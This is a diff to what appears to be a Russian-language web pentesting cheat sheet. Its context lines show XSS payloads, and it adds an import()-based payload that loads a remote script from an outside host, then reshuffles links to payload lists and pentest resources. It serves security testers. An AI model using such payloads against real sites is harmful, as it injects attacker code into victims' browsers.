@@ -357,6 +357,10 @@ Polyglot XSS - Mathias Karlsson
 Дополнительно к картинке можно изменить
   Content-Type: image/jpeg на Content-Type: text/html
   "><svg onload=alert(1)>.jpg
+  
+В Chrome и Safari достаточно использовать функцию import. Например
+<img src onerror=import('//bo0om.ru/x/')>
+ Для ответа у нашего скрипта должен быть настроен CORS, но в этом никакой проблемы нет.
 
 "><img src=x onerror=prompt(document.domain)>
 
@@ -913,9 +917,6 @@ Xss
 https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 http://html5sec.org/
-https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
-https://github.com/payloadbox/xss-payload-list
-https://github.com/s0md3v/AwesomeXSS
 
 Markdown's XSS Vulnerability
 https://github.com/showdownjs/showdown/wiki/Markdown's-XSS-Vulnerability-(and-how-to-mitigate-it)
@@ -956,8 +957,14 @@ https://github.com/onlurking/awesome-infosec
 PENTESTING-BIBLE
 https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE
 
+Penetration-Testing
+https://github.com/jtesta/Penetration-Testing
+
 Pentest Bookmarks
 https://github.com/kurobeats/pentest-bookmarks/blob/master/BookmarksList.md
+
+Bugcrowd_university
+https://github.com/bugcrowd/bugcrowd_university
 ```
 
 **Wordlist**
@@ -968,9 +975,16 @@ danielmiessler - https://github.com/danielmiessler/SecLists
 
 swisskyrepo - https://github.com/swisskyrepo/PayloadsAllTheThings
 
+s0md3v AwesomeXSS - https://github.com/s0md3v/AwesomeXSS
+
 XSS Filter Evasion Cheat Sheet - https://sking7.github.io/articles/218647712.html
 
-cujanovic - https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt
+xss-payload-list - https://github.com/payloadbox/xss-payload-list
+
+xss_vectors - https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
+
+
+cujanovic (CRLF-payloads) - https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt
 
 NickSanzotta -  https://github.com/NickSanzotta/BurpIntruder
 
